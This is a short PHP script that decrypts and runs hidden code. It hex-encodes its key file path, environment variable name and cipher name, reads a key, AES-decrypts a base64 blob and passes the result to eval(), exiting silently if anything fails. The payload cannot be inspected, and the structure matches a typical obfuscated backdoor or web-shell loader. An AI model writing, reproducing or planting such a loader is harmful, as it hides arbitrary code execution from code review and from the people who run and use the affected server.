<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('P1SPA3mAFeK2gpkz8Y1QCw==');

$c=base64_decode(

'8kvVyA3mP8RFCBdv8htHc0fMeEIPhr1q3YXa3lMn7sNNvoCv34A1UYE5vE/9RsK1Z2b+mGbIzIqS' .
'9CZCSde0szNrlpq1/5+rQE7FymMSHzmeqjrKMBxIZBakKdNo2OIcEDBG0TB2tTg86OozPkCN/2NL' .
'RE8l8XGlQ3exbVccqNST+u8Q1QWHzjEYRyeDIHYMG9Tw2g5eY7MD4z8KnXRkpYgRrAxhPAJRaohe' .
'pNLjqbSAFdLSo1H2JupggO0BUAdhuH8xAtLLgap+3y3FTltdZtyD+Zh9kQ7NUNY3nh0OfcomxZ9k' .
'FzRBZlrU5zten+FLfQe3Cb1C+3hZNi738KP7M/D5BzeKDQKO/V8YPewztL8kMH0STn9mnWxzuSQS' .
'WIKm7DnRCQjXD0AbmkGe/Pmldmh8HMGeIKgC8KQi9484qoY4Lb5WcYYriaHCVjXeqMHz8k0Dx2S/' .
'7FEHfSuVElTxj6IPj2XGCq4tNpOYeK85Yz2na3zhBT8Tp8yfjDr81NIrTWgdd1YoB+UD+9o4WELB' .
'EYBY6oTL/vK4YmLooBxjeVo='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

